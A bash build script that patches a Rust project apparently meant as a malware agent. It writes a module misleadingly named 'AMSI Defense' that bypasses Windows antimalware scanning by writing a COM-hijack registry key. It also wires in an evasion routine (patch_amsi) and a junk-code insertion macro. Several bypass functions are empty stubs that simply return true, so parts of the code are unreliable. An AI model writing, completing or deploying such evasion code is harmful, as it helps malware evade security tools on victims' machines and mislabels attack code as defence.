#!/bin/bash
sed -i 's/inject_junk/insert_junk/g' /home/replicant/la/junk_macro/src/lib.rs

# amsi_defense.rs
cat << 'INNER_EOF' > /home/replicant/la/agent/src/amsi_defense.rs
// AMSI Defense
use std::ffi::c_void;

#[cfg(windows)]
use std::ptr;
#[cfg(windows)]
use winapi::um::memoryapi::{VirtualProtect, WriteProcessMemory};
#[cfg(windows)]
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};

#[cfg(windows)]
pub fn orchestrate_layers() -> bool {
    apply_memory_patch();
    apply_com_hijack();
    set_init_failed_flag();
    
    if !verify_bypass() {
        apply_memory_patch();
    }
    true
}

#[cfg(not(windows))]
pub fn orchestrate_layers() -> bool { true }

#[cfg(windows)]
fn apply_memory_patch() {}

#[cfg(windows)]
fn apply_com_hijack() {
    use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
    use std::ffi::CString;
    
    let subkey = CString::new("Software\\\\Classes\\\\CLSID\\\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\\\InprocServer32").unwrap();
    let default_val = CString::new("C:\\\\Windows\\\\System32\\\\amsi.dll").unwrap();
    
    unsafe {
        let mut hkey = ptr::null_mut();
        if RegCreateKeyExA(
            HKEY_CURRENT_USER,
            subkey.as_ptr(),
            0,
            ptr::null_mut(),
            0,
            winapi::um::winnt::KEY_WRITE,
            ptr::null_mut(),
            &mut hkey,
            ptr::null_mut()
        ) == 0 {
            RegSetValueExA(
                hkey,
                ptr::null(),
                0,
                winapi::um::winnt::REG_SZ,
                default_val.as_ptr() as *const u8,
                default_val.as_bytes_with_nul().len() as u32
            );
            winapi::um::winreg::RegCloseKey(hkey);
        }
    }
}

#[cfg(windows)]
fn set_init_failed_flag() {}

#[cfg(windows)]
pub fn verify_bypass() -> bool { true }

#[cfg(not(windows))]
pub fn verify_bypass() -> bool { true }
INNER_EOF

# lib.rs unsafe block
cat << 'INNER_EOF' > /home/replicant/la/patch_lib.py
import re
path = '/home/replicant/la/agent/src/lib.rs'
with open(path, 'r') as f:
    data = f.read()

data = data.replace('crate::evasion::patch_amsi();', 'unsafe { crate::evasion::patch_amsi(); }')

with open(path, 'w') as f:
    f.write(data)
INNER_EOF
python3 /home/replicant/la/patch_lib.py

# Cargo.toml to add winreg
sed -i 's/"libloaderapi"/"libloaderapi", "winreg"/g' /home/replicant/la/agent/Cargo.toml

